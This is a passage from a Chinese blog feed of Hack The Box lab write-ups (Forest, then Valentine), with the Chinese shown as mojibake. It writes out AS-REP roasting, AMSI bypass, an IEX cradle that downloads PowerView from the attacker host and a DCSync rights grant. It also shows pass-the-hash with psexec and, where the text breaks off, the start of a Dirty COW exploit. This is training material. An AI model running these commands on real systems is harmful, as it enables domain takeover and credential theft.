<p><strong>åœ¨è¯·æ±‚ TGTï¼ˆç¥¨è¯æˆäºˆç¥¨è¯ï¼‰æ—¶ï¼Œç¬¬ä¸€æ­¥ï¼Œè¯·æ±‚æ–¹ï¼ˆç”¨æˆ·ï¼‰ä½¿ç”¨è‡ªå·±çš„ NTLM å“ˆå¸ŒåŠ å¯†æ—¶é—´æˆ³ï¼Œå¹¶å°†å…¶å‘é€åˆ° KDCï¼ˆå¯†é’¥åˆ†å‘ä¸­å¿ƒï¼‰ï¼Œå³åŸŸæ§åˆ¶å™¨ã€‚ç°åœ¨ï¼Œå¦‚æœ KDC ä½¿ç”¨è¯·æ±‚ç”¨æˆ·çš„ NTLM å“ˆå¸ŒæˆåŠŸè§£å¯†æ—¶é—´æˆ³ï¼ŒKDC å°†çŸ¥é“è¯·æ±‚ç”¨æˆ·æ˜¯æœ‰æ•ˆç”¨æˆ·ã€‚<br>å¯ä»¥ç¦ç”¨æ­¤æ£€æŸ¥ï¼ˆè¿™ä¸æ˜¯é»˜è®¤æƒ…å†µï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒKDC ä¸ä¼šéªŒè¯è¯·æ±‚ TGT çš„ç”¨æˆ·æ˜¯å¦æœ‰æ•ˆï¼Œè€Œæ˜¯å°† TGT å‘é€å›è¯·æ±‚è€…ã€‚<br>è¯¥ TGT åŒ…å«ä½¿ç”¨è¯·æ±‚ç”¨æˆ·çš„ NTLM å“ˆå¸ŒåŠ å¯†çš„éƒ¨åˆ†æ•°æ®ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†å“ˆå¸Œè„±æœºå¹¶å°è¯•ç ´è§£å®ƒã€‚</strong></p>
</blockquote>
<p>é‚£æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>impacket</code>åŒ…ä¸­çš„<code>GetNPUsers.py</code>è¿™ä¸ªè„šæœ¬å»è¯·æ±‚TGTï¼Œç›´æ¥è·å–æ˜“å—æ”»å‡»çš„ç”¨æˆ·ååŠå¯¹åº”çš„å“ˆå¸Œå€¼<br><img src="https://img-blog.csdnimg.cn/5284eb6938a448ed9fc2c450536c9ebc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨<code>john</code>æ¥ç ´è§£è¿™ä¸ªhashå€¼ï¼Œç ´è§£çš„æ˜æ–‡å€¼ä¸º<code>s3rvice</code><br><img src="https://img-blog.csdnimg.cn/171d16fb086e4306aed46bcfde8464e3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨hashcatæ¥ç ´è§£</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 -w 3 forest.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/ac55b719cfc140b1ada3ab3f1ec23de1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å› ä¸ºä¸Šè¾¹æˆ‘ä»¬æ‰«æåˆ°ä¸»æœºå¼€æ”¾äº†5985ç«¯å£ï¼Œé‚£è¯æ˜ä¸»æœºå¼€æ”¾äº†WinRMæœåŠ¡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u <span class="string">&#x27;svc-alfresco&#x27;</span> -p <span class="string">&#x27;s3rvice&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/391c73ad0f65465dbec84f80162fe866.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬ä½¿ç”¨Bloodhoundè¿™ä¸ªå·¥å…·æŸ¥è¯¢æ˜¯å¦æœ‰æ½œåœ¨çš„ææƒè·¯å¾„ï¼Œé¦–å…ˆæˆ‘ä»¬å¾—å…ˆæŠŠå®¢æˆ·ç«¯<code>SharpHound.exe</code>ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸Šï¼Œå¹¶è¿è¡Œå®ƒ<br><img src="https://img-blog.csdnimg.cn/df95f275e38340aba9d52b2aa90c838e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/eaa70b145a0143d790b4d8c629a36d7f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬ä¼ è¾“ï¼Œæˆ‘ä»¬åœ¨æœ¬æœºä¸Šæ­å»ºä¸€ä¸ªSMBæœåŠ¡å™¨<br><img src="https://img-blog.csdnimg.cn/a6dcecf002764ceb89b526cfc469f895.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬å°†å‹ç¼©åŒ…å¤åˆ¶åˆ°æœ¬æœºä¸Š<br><img src="https://img-blog.csdnimg.cn/9c2108c5892d4762af178e042896411e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨æ”»å‡»æœºä¸Šå¯åŠ¨bloodhoundï¼Œå¹¶å°†å‹ç¼©åŒ…æ‹–è¿›bloodhoundä¸­<br><img src="https://img-blog.csdnimg.cn/0e1aedb210f74238ba29dd65d3cfb738.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åç‚¹å‡»æœ€åä¸€ä¸ªé€‰é¡¹ï¼ŒæŸ¥çœ‹å¯ä»¥è¿›è¡Œå“ˆå¸Œä¼ é€’çš„ç”¨æˆ·<br><img src="https://img-blog.csdnimg.cn/7d5109e17fd740c08689be66a2ce0c35.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åå†ç‚¹å‡»è¿™ä¸ªé€‰é¡¹<br><img src="https://img-blog.csdnimg.cn/e417b9a4c91442eeb7e5f52dc99ec7be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/6899426da41d42139be684f6f99e7772.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥çœ‹åˆ°<code>svc-alfresco</code>è¿™ä¸ªç”¨æˆ·æ˜¯å±äº<code>service account</code>è¿™ä¸ªç»„çš„æˆå‘˜ï¼ŒåŒæ—¶å®ƒä¹Ÿæ˜¯<code>Privileged IT Accounts</code>çš„æˆå‘˜ï¼Œå®ƒä¹Ÿæ˜¯<code>account operators</code>çš„æˆå‘˜ã€‚å®ƒå…è®¸è¯¥ç»„çš„æˆå‘˜åˆ›å»ºå’Œä¿®æ”¹ç”¨æˆ·å¹¶å°†å…¶æ·»åŠ åˆ°ä¸å—ä¿æŠ¤çš„ç»„<br><img src="https://img-blog.csdnimg.cn/e2cdb6b465b74640a64b7ea297939ce3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬ç°åœ¨ç‚¹å‡»<code>Shortest Paths to High Value Targets</code>ï¼ŒæŸ¥çœ‹å»å¾€é«˜æƒé™ç›®æ ‡çš„è·¯å¾„ã€‚è¯¥ç”¨æˆ·å…·æœ‰<code>GenericAll</code>çš„æƒé™å’Œ<code>Exchange Windows</code>æƒé™ç»„ã€‚åœ¨<code>Exchange Windows</code>æƒé™ç»„å…·æœ‰<code>WriteDacl</code>åœ¨åŸŸçš„æƒé™ã€‚è¯¥<code>WriteDacl</code>æƒé™ä½¿ç”¨æˆ·èƒ½å¤Ÿå‘å¯¹è±¡æ·»åŠ <code>DACL</code>ï¼ˆè‡ªç”±è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼‰ã€‚<br><img src="https://img-blog.csdnimg.cn/c6d80a75b47946b2bb2b74041117d941.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>é‚£å°±æ„å‘³ç€ï¼š</strong></p>
<p> <strong>1. æˆ‘ä»¬å¯ä»¥å°†ç”¨æˆ·æ·»åŠ åˆ°Exchange Windows æƒé™ç»„ã€‚<br> 2. ç„¶åï¼Œç”±äº Exchange ç»„æœ‰WriteDaclæƒé™ï¼Œæˆ‘ä»¬å¯ä»¥å°†DCSyncæƒé™æˆäºˆæˆ‘ä»¬åˆ›å»ºçš„ç”¨æˆ·ã€‚</strong></p>
<blockquote>
<p> <strong>DCsyncæ˜¯å‡ ä¸ªæƒé™çš„é›†åˆä½“ï¼Œæ˜¯åŸŸæ¸—é€ä¸­ç»å¸¸ä¼šç”¨åˆ°çš„æŠ€æœ¯ï¼Œå¦‚æœæ™®é€šç”¨æˆ·æƒ³å…·æœ‰DCsyncæƒé™ï¼Œå¯ä»¥ç»™å¯¹è±¡æ·»åŠ ä»¥ä¸‹ä¸‰æ¡ACEï¼š<br> DS-Replication-Get-Changesï¼Œå¯¹åº”GUIDä¸ºï¼š1131f6aa-9c07-11d1-f79f-00c04fc2dcd2<br> DS-Replication-Get-Changes-Allï¼Œå¯¹åº”GUIDä¸ºï¼š1131f6ad-9c07-11d1-f79f-00c04fc2dcd2<br> DS-Replication-Get-Changes-In-Filtered-Setï¼Œå¯¹åº”GUIDä¸ºï¼š89e95b76-444d-4c62-991a-0facbeda640c</strong></p>
</blockquote>
<h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>é¦–å…ˆæˆ‘ä»¬å…ˆå°†ç”¨æˆ·æ·»åŠ åˆ°åŸŸä¸­<br><img src="https://img-blog.csdnimg.cn/412def70d225418188f892346169b474.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬å°†ç”¨æˆ·æ·»åŠ åˆ°<code>Exchange Windows</code>æƒé™ç»„<br><img src="https://img-blog.csdnimg.cn/ead54544e07d4f67bcb1f4d5c4c973d0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬çœ‹çœ‹èœå•ï¼Œæˆ‘ä»¬é€‰æ‹©<code>Bypass-4MSI</code>ï¼Œ<code>Bypass-4MSI</code>å‘½ä»¤ç”¨äºåœ¨å¯¼å…¥è„šæœ¬ä¹‹å‰è§„é¿é˜²å¾¡è€…ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>Add-ObjectACL</code>å’Œ<code>john</code>çš„å‡­è¯ï¼Œå¹¶ç»™ä»–<code>DCSync</code>æƒé™ã€‚<br><img src="https://img-blog.csdnimg.cn/84b58436b0f54790bfdc7e1e5823e29a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åè¾“å…¥ä»¥ä¸‹çš„powershellçš„ä»£ç </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).downloadString(<span class="string">&#x27;http://10.10.14.11/PowerView.ps1&#x27;</span>)</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="variable">$Secpassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;password1234&#x27;</span> <span class="literal">-asplaintext</span> <span class="literal">-force</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;HTB\pyh&#x27;</span>,<span class="variable">$Secpassword</span>)</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="built_in">Add-ObjectAcl</span> <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=htb,DC=local&quot;</span> <span class="literal">-PrincipalIdentity</span> pyh <span class="literal">-Rights</span> DCSync</span><br></pre></td></tr></table></figure>
<p>å¼€å¯ä¸€ä¸ªå°å‹æœåŠ¡å™¨<br><img src="https://img-blog.csdnimg.cn/37f75053912d4977b8ec82cc263da07f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰§è¡Œå®Œæˆåï¼Œæˆ‘ä»¬ä½¿ç”¨<code>secretdumps.py</code>è„šæœ¬è·å–ç”¨æˆ·åå¯¹åº”çš„å“ˆå¸Œå€¼ã€‚è¿™é‡Œæˆ‘ä»¬è·å–åˆ°äº†ç®¡ç†å‘˜çš„å“ˆå¸Œå€¼<br><img src="https://img-blog.csdnimg.cn/16f9219409ec4fa78100ba391a0cf942.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨<code>psexec.py</code>è„šæœ¬æ¥è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œè·å–åˆ°è¶…çº§ç®¡ç†å‘˜æƒé™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/87f2253887984b2f8852806cd45909bb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>å†…ç½‘</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Valentine</title>
    <url>/2021/12/24/Valentine/</url>
    <content><![CDATA[<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><p><img src="https://img-blog.csdnimg.cn/48b5e5c02ff845d5b280499511915293.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å¯ä»¥çœ‹åˆ°ä¸»æœºå¼€æ”¾äº†webæœåŠ¡å’ŒsshæœåŠ¡ï¼Œè¿™é‡Œå‘ç°äº†<code>valentine.htb</code>è¿™ä¸ªå­åŸŸï¼Œæˆ‘ä»¬å¯ä»¥å°†å®ƒå¯¹åº”çš„è§£æåœ°å€æ·»åŠ åˆ°hostsæ–‡ä»¶ä¸­å»<br><img src="https://img-blog.csdnimg.cn/a1a3512aec184664808f7b0dfdab121b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>è®¿é—®å…¶webæœåŠ¡çš„æ—¶å€™ï¼Œå°±åªæœ‰ä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥çœ‹ä»£ç æºç å•¥çš„éƒ½æ²¡æœ‰ï¼Œä½†æ˜¯è¿™å¼ å›¾ç‰‡çš„å¿ƒè„åœ¨æ»´è¡€ï¼Œæˆ‘ä»¬ä¸éš¾çŒœåˆ°æ˜¯å¿ƒè„æ»´è¡€æ¼æ´å§<br><img src="https://img-blog.csdnimg.cn/d9abb29e5cc84619b8c2c6942db20ce4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬æƒ³ç”¨è„šæœ¬æ£€æµ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¿ƒè„æ»´è¡€æ¼æ´ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•æ£€æµ‹è¿™ä¸ªæ¼æ´ï¼Œä¸€ç§æ˜¯ä½¿ç”¨<code>heartbleed.py</code>è¿™ä¸ªpythonè„šæœ¬ï¼Œå¦ä¸€ç§æ˜¯ä½¿ç”¨nmapè‡ªå¸¦çš„nseè„šæœ¬æ£€æµ‹<br><img src="https://img-blog.csdnimg.cn/59444c0ee5d544d298302502fd349bb4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/49fbb69ace90495f904853d28bb58c96.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æˆ‘ä»¬å‘ç°äº†ä¸€æ®µbase64çš„åŠ å¯†ä¿¡æ¯<code>$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</code>ï¼Œè§£ç å‘ç°æ˜æ–‡æ˜¯<code>heartbleedbelievethehype</code>ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œå…ˆç•™ç€æˆ–è®¸åé¢æœ‰ç”¨ã€‚<br><img src="https://img-blog.csdnimg.cn/c2499b79b1d24bf5b41b4827e80eab52.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›®å‰æ¥è¯´æ²¡å•¥å¯åˆ©ç”¨çš„ä¿¡æ¯äº†ï¼Œæˆ‘ä»¬è¿›è¡Œæ‰«ä¸€æ³¢ç›®å½•å§ã€‚å‘ç°äº†ä¸‰ä¸ªå¯è®¿é—®çš„ç›®å½•<br><img src="https://img-blog.csdnimg.cn/921fb947413e49f9835045472777f608.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>devç›®å½•ä¸‹ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª<code>hype_key</code>å’Œ<code>notes.txt</code>è¿™ä¸¤ä¸ªæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/aca3b9d5338b426880717055af939c05.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_18,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰“å¼€hype_keyå‘ç°æ˜¯ä¸€å †åå…­è¿›åˆ¶çš„å­—ç¬¦ï¼Œæˆ‘ä»¬è§£ç ä¹‹åå‘ç°æ˜¯ä¸€ä¸ªç§é’¥<br><img src="https://img-blog.csdnimg.cn/ca8014a8611e4285a8dcc55497aee1f6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p><img src="https://img-blog.csdnimg.cn/b2d08002b1724754a58cebb6117ef1b6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬å‘ç°ä¹‹å‰ä¸æ˜¯æœ‰ä¸€ä¸ªç±»ä¼¼å¯†ç çš„å­—ç¬¦ä¸²çš„å—ã€‚æˆ‘ä»¬å°è¯•ç™»é™†ï¼Œå¹¶ä¸”æˆåŠŸäº†ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹åˆ°user.txtæ–‡ä»¶å†…å®¹<br><img src="https://img-blog.csdnimg.cn/2e18c2941c3045edaccc7ebcbcdc2db3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/afb0ff3e8d0145d9bf0d2a26c4608e2b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>è¿™é‡Œæˆ‘ä»¬å¼€å¯ä¸€ä¸ªæœåŠ¡å™¨ï¼Œä¸Šä¼ <code>linpeas.sh</code>è¿™ä¸ªè„šæœ¬åˆ°ç›®æ ‡æœºå™¨ä¸Šï¼Œè¿™ä¸ªè„šæœ¬åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œæ˜¯ä¸“é—¨é’ˆå¯¹Linuxææƒçš„ä¸€ä¸ªè„šæœ¬å·¥å…·ã€‚å®ƒæ˜¯ç”±Carlos Påˆ›å»ºçš„ï¼Œç›®çš„æ˜¯åˆ—ä¸¾åœ¨Linuxç³»ç»Ÿä¸Šæå‡ç‰¹æƒçš„æ‰€æœ‰å¯èƒ½æ–¹æ³•ã€‚<br><img src="https://img-blog.csdnimg.cn/d6d15cb2cccf4a7fa46092fd5a3db58e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/06085062db3d40459a5ecef0a53d7a13.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>èµ‹äºˆæ‰§è¡Œæƒé™å¹¶è¿è¡Œè¿™ä¸ªè„šæœ¬ï¼Œè¿™é‡Œæœ‰ä¸¤ç§ææƒçš„æ–¹æ³•ï¼Œä¸€ç§æ˜¯è„ç‰›ææƒï¼Œè¿™ä¸ªç®€å•å¿«æ·ï¼›å¦ä¸€ç§åˆ©ç”¨<code>tmux</code>è¿™ä¸ªåº”ç”¨ç¨‹åºæ¥å®æ–½ææƒã€‚</p>
<h3 id="è„ç‰›ææƒ"><a href="#è„ç‰›ææƒ" class="headerlink" title="è„ç‰›ææƒ"></a>è„ç‰›ææƒ</h3><p>è¿™é‡Œæˆ‘ä»¬å‘ç°è¿™ä¸ªLinuxç‰ˆæœ¬è¾ƒä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è„ç‰›è¿›è¡Œææƒ<br><img src="https://img-blog.csdnimg.cn/d06348beabfc4b279891a1cfc60a32a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨<code>exploit-db</code>ä¸Šå¯ä»¥å‘ç°åˆ©ç”¨çš„è„šæœ¬<br><img src="https://img-blog.csdnimg.cn/4e45a7c7bc434452b0dbe78a15ff87c1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™æ˜¯æ•´ä¸ªè„šæœ¬çš„å†…å®¹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This exploit uses the pokemon exploit of the dirtycow vulnerability</span></span><br><span class="line"><span class="comment">// as a base and automatically generates a new passwd line.</span></span><br><span class="line"><span class="comment">// The user will be prompted for the new password when the binary is run.</span></span><br><span class="line"><span class="comment">// The original /etc/passwd file is then backed up to /tmp/passwd.bak</span></span><br><span class="line"><span class="comment">// and overwrites the root account with the generated line.</span></span><br><span class="line"><span class="comment">// After running the exploit you should be able to login with the newly</span></span><br><span class="line"><span class="comment">// created user.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// To use this exploit modify the user values according to your needs.</span></span><br><span class="line"><span class="comment">//   The default is &quot;firefart&quot;.</span></span><br><span class="line"><span 